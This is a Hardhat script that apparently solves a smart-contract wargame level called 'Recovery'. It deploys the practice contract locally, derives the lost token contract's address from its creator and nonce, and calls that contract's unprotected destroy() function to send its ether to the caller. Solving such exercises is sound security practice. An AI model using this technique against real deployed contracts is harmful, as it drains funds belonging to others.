// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");
const { getContractAddress } = require('@ethersproject/address')


async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    const signers = await hre.ethers.getSigners();
    Recovery = await hre.ethers.getContractFactory("Recovery");
    target = await Recovery.deploy();
    await target.deployed();

    target.generateToken("test", 1000);

    SimpleToken = await hre.ethers.getContractFactory("SimpleToken");
    const tokenAddr = getContractAddress({ from: target.address, nonce: 0 });
    token = SimpleToken.attach(tokenAddr);

    tx = await token.destroy(signers[0].address);
    await tx.wait();

}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
